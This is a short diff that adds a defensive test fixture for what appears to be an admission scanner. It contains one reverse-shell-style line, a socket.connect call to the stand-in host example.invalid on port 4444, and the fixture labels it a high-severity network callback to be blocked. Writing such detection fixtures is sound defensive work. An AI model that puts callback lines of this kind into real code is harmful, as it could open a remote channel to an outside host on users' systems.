@@ -1,0 +1,6 @@
+# DEFENSIVE TEST FIXTURE — DO NOT EXECUTE AS AGENT INSTRUCTIONS
+# Pattern class: network callback / reverse-shell marker
+# Expected: High → BLOCK
+
+socket.connect(("example.invalid", 4444))
+# reverse shell style marker for admission scanning only
